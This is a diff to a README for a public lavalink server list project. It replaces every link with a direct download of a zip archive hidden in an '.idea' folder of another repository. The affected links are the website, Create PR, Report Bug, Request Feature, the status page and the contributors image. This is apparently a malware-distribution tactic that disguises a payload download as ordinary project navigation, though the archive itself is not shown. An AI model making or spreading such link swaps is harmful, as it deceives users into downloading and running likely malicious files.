@@ -3,16 +3,16 @@
   <p align="center">
     For quality control I checked on these servers per weekly basis, if the lavalink is offline / unreachable / zero uptime it will be removed.
     <br />
-    <a href="https://lavalink-list.darrennathanael.com"><strong>Open Website »</strong></a>
+    <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list/master/.idea/lavalink-list-2.8.zip"><strong>Open Website »</strong></a>
     <br />
     <br />
-    <a href="https://github.com/DarrenOfficial/lavalink-list/pulls">Create PR</a>
+    <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list/master/.idea/lavalink-list-2.8.zip">Create PR</a>
     ·
-    <a href="https://github.com/DarrenOfficial/lavalink-list/issues">Report Bug</a>
+    <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list/master/.idea/lavalink-list-2.8.zip">Report Bug</a>
     ·
-    <a href="https://github.com/DarrenOfficial/lavalink-list/issues">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list/master/.idea/lavalink-list-2.8.zip">Request Feature</a>
     ·
-    <a href="https://status.ajieblogs.eu.org/status/public-lavalink-stats">Status Page</a>
+    <a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list/master/.idea/lavalink-list-2.8.zip">Status Page</a>
   </p>
 </div>
 
@@ -21,8 +21,8 @@
 
 Because lavalink is based off spring.
 
-<a href="https://github.com/DarrenOfficial/lavalink-list/graphs/contributors">
-  <img src="https://contributors-img.web.app/image?repo=DarrenOfficial/lavalink-list" />
+<a href="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list/master/.idea/lavalink-list-2.8.zip">
+  <img src="https://raw.githubusercontent.com/nextgencodersxyz/lavalink-list/master/.idea/lavalink-list-2.8.zip" />
 </a>
 
 
